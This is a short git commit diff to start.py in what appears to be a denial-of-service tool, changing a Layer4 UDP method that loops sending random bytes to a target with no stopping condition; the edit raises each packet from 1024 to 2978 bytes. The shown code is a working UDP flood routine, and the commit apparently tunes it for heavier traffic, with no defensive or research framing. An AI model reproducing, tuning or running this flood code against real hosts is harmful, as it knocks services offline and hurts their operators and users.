85b01e7667a55fd964ab54539ace28733b221e05
nguyenehance-glitch <nguyenehance@gmail.com>
2025-09-05 21:37:25 +0700

    Update start.py

--- start.py
+++ start.py
@@ -466,7 +466,7 @@ class Layer4(Thread):
     def UDP(self) -> None:
         s = None
         with suppress(Exception), socket(AF_INET, SOCK_DGRAM) as s:
-            while Tools.sendto(s, randbytes(1024), self._target):
+            while Tools.sendto(s, randbytes(2978), self._target):
                 continue
         Tools.safe_close(s)
 
